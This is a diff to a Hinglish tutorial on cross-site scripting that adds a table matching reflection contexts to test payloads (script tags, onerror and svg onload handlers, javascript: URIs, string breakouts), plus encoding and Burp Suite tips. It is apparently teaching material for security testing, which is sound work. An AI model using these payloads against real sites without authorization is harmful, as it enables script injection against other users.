@@ -29,7 +29,7 @@ Yahi se tu context samjhta hai!
 
 ---
 
-###🔹 Step 3: JavaScript ka XSS se kya connection?
+### 🔹 Step 3: JavaScript ka XSS se kya connection?
 
 XSS ka full form: **Cross-Site Scripting**
 
@@ -47,3 +47,24 @@ Example:
 ---
 
 ### 🔹 Step 4: Payload daalne ka logic (Context Based)
+
+| Reflection kahan ho rahi hai?        | Kaunsa Payload Try Karna Chahiye?          |
+| ------------------------------------ | ------------------------------------------ |
+| `<div>input_here</div>`              | `<script>alert(1)</script>`                |
+| `<img src="input_here">`             | `x" onerror="alert(1)`                     |
+| `<a href="input_here">`              | `javascript:alert(1)`                      |
+| `var data = "input_here"`            | `";alert(1);//`                            |
+| URL ke end mein `?search=input_here` | `<svg/onload=alert(1)>` ya encoded payload |
+
+---
+
+### Step 5: Agar reflection nahi nazar aa rahi?
+
+Try encoding payload (%3Cscript%3Ealert(1)%3C/script%3E)
+
+Try BurpSuite se decode kar ke dekh
+
+Source code view karo (Ctrl+U)
+
+Burp repeater mein test karo
+
